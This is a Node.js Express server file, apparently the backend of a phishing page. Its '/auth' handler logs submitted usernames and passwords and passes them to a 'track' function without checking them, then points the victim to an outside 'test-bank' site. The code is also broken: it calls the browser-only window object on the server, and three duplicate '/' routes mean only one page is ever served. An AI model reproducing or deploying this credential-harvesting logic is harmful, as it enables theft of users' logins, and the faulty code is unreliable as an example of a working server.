/*
const opn = require('opn');

var express = require("express");

var app = express();

app.use(express.static('public'));

//make way for some custom css, js and images
app.use('/css', express.static(__dirname + '/public/css'));
app.use('/js', express.static(__dirname + '/public/js'));
app.use('/images', express.static(__dirname + '/public/images'));

var server = app.listen(8081, function(){
    var port = server.address().port;
    console.log("Server started at http://localhost:%s", port);

    opn('http://localhost:8080')
      .catch(() => {});
});
*/

const http = require("http");
const fs = require("fs");
var express = require("express");
var cors = require("cors");
const { track } = require("./Tracking")
const hostname = "127.0.0.1";
const port = 3000;

const app = express();

app.use(cors());
app.use(express.json());

app.get("/", (req, res) => {
  fs.readFile("./public/index.html", "utf8", function (err, text) {
    res.send(text);
  });
});
app.get("/", (req, res) => {
  fs.readFile("./public/about.html", "utf8", function (err, text) {
    res.send(text);
  });
});
app.get("/", (req, res) => {
  fs.readFile("./public/contact.html", "utf8", function (err, text) {
    res.send(text);
  });
});

app.post("/auth", (req, res) => {
  console.log(req.body);

  var user = req.body.user;
  var pass = req.body.pass;

  // If info correct send redirect
  track(user, pass);
  window.location.replace("https://www.mess-segm.ca/test-bank");
});


app.listen(port, () => console.log(`Example app listening on port ${port}!`));
//app.redirect('http://localhost:3000')
